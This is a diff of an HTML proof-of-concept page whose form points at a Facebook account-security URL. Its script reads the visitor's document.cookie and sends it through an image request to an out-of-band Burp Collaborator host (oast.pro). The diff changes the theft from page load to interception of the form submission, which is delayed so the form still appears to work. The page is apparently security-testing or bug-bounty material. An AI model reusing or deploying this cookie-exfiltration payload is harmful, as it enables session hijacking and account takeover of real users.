@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>108 Capture Entire GET Request</title>
+    <title>Capture GET Request Cookies</title>
 </head>
 <body>
     <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
@@ -12,23 +12,23 @@
         <input type="submit" value="Send">
     </form>
     <script>
-        // Function to capture entire GET request
-        function captureEntireGETRequest() {
-            var form = document.getElementById('myForm');
-            var formData = new FormData(form); // Extract form data
-            var queryString = new URLSearchParams(formData).toString(); // Convert form data to query string
+        // Function to capture GET request cookies
+        function captureGETRequestCookies() {
             var cookies = document.cookie; // Get cookies from document
-            var actionUrl = form.getAttribute('action'); // Get form action URL
-            var fullUrl = actionUrl + '?' + queryString + '&' + encodeURIComponent(cookies); // Construct full URL with form data and cookies
-            // Send the full URL to the Burp Suite collaborator
+            // Send the cookies to the Burp Suite collaborator
             var img = new Image();
-            img.src = "http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?fullUrl=" + encodeURIComponent(fullUrl);
+            img.src = "http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?cookies=" + encodeURIComponent(cookies);
         }
 
-        // Function to capture entire GET request when the page loads
-        window.onload = function() {
-            captureEntireGETRequest();
-        };
+        // Function to intercept form submission and capture GET request cookies
+        document.getElementById('myForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the form from being submitted
+            captureGETRequestCookies(); // Capture cookies
+            // Perform form submission
+            setTimeout(function() {
+                document.getElementById('myForm').submit();
+            }, 1000); // Adjust the delay as needed
+        });
     </script>
 </body>
 </html>
